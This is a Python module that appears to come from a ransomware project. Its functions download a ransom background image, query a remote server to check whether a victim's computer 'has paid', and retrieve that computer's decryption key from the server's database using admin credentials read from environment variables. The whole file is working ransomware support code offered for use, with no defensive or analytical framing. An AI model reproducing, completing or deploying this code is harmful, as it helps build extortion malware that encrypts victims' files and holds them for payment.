#  Copyright (c) 2022. Esteban Restoy e.restoy24@gmail.com

"""System modules"""
import base64
import os
import shutil
import requests

IMAGE_URL: str = os.getenv("BACKGROUND_IMAGE_URL")
FILE_NAME = os.getenv("BACKGROUND_IMAGE_NAME")
WEB_SERVER_URL_COMPUTER_DETAIL_GET: str = os.getenv("WEB_SERVER_URL_COMPUTER_DETAIL_GET")


def get_image_from_the_web(url: str = IMAGE_URL):
    """
    This function is used download an image from the web
    1) Make a GET request to get the image
    2) Check if the request successfully run
    3) Create an image file on the PC of the host
    :param url: The url of the image
    """
    res = requests.get(url, stream=True)

    if res.status_code == 200:
        with open(FILE_NAME, 'wb') as file:
            shutil.copyfileobj(res.raw, file)
        print('Image successfully Downloaded: ', FILE_NAME)
    else:
        print('Image Could\'t be retrieved')

    return FILE_NAME


def get_has_paid(computer_id: str):
    """
    This function is used to check if the client has paid on the web server
    1) Make a GET request to get the has_paid field
    2) return the response
    :param computer_id: the computer id
    """

    headers = {
        'Authorization': 'Basic ' + base64.b64encode((os.getenv("API_ADMIN_USERNAME") + ":" +
                                                      os.getenv("API_ADMIN_PASSWORD")).encode()).decode(),
    }

    res = requests.get(WEB_SERVER_URL_COMPUTER_DETAIL_GET + str(computer_id) + "/", headers=headers)

    if res.status_code == 200:
        return res.json()["has_paid"]
    else:
        print('Error with the server !')

    return False


def get_the_decryption_key(computer_id: str):
    """
    This function is used to get the decryption key store on the web server DB
    1) Make a GET request to get the decryption_key field
    2) return the response
    :param computer_id: the computer id
    """

    headers = {
        'Authorization': 'Basic ' + base64.b64encode((os.getenv("API_ADMIN_USERNAME") + ":" +
                                                      os.getenv("API_ADMIN_PASSWORD")).encode()).decode(),
    }

    res = requests.get(WEB_SERVER_URL_COMPUTER_DETAIL_GET + str(computer_id), headers=headers)

    if res.status_code == 200:
        return res.json()["decryption_key"]
    else:
        print('Error with the server !')

    return False